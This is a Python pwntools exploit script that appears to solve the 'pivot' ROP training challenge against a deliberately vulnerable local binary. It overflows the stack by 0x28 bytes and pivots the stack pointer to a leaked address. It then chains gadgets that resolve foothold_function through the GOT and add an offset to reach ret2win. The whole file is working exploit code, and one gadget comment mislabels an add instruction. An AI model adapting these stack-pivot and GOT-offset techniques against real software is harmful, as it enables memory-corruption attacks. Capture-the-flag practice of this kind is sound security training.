#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./pivot
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./pivot')
libpivot = ELF("./libpivot.so")
context.terminal = ["/usr/bin/konsole", "-e", "sh", "-c"]
# context.log_level = "debug"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)
# RUNPATH:  b'.'

io = start()

RET = p64(0x4006b6) # ret
POPRDI = p64(0x400a33) # pop rdi ; ret
POPRAX = p64(0x4009bb) # pop rax ; ret
POPRBP = p64(0x4007c8) # pop rbp ; ret
CALLRAX = p64(0x4006b0) # call rax
MOVRAXRAX = p64(0x4009c0) # mov rax, [rax] ; ret
ADDRAXRBP = p64(0x4009c4) # mov rax, rbp ; ret
XCHGRSPRAX = p64(0x4009bd) # xchg rsp, rax ; ret

def get_pivot_point(pivot_line: str) -> int:
    num_index = pivot_line.index("0x")
    address_str = pivot_line[num_index:]
    return int(address_str, 16)

io.recvline()
io.recvline()
io.recvline()
io.recvline()
pivot_point = get_pivot_point(io.recvline().decode().strip())
print(f"{hex(pivot_point)=}")
print(f"{hex(libpivot.symbols['foothold_function'])=}")

# force dynamic linker to resolve foothold_function in got
attack = p64(exe.plt["foothold_function"])
# after foothold_function returns to us
# the got entry of foothold_function stores the location of the actual foothold_function
attack += POPRAX + p64(exe.got["foothold_function"])
attack += POPRBP + p64(libpivot.symbols["ret2win"] - libpivot.symbols["foothold_function"]) # offset
# load the location of foothold_function from foothold_function@got
attack += MOVRAXRAX # mov rax, [rax] ; ret
attack += ADDRAXRBP # add offset
attack += CALLRAX

print(attack)
print(len(attack))
io.sendline(attack)
print("sent attack")

smash = b"A"*0x28
smash += POPRAX + p64(pivot_point) + XCHGRSPRAX # exactly 24 bytes

print(smash)
print(len(smash))
io.sendline(smash)
print("sent smash")

io.interactive()

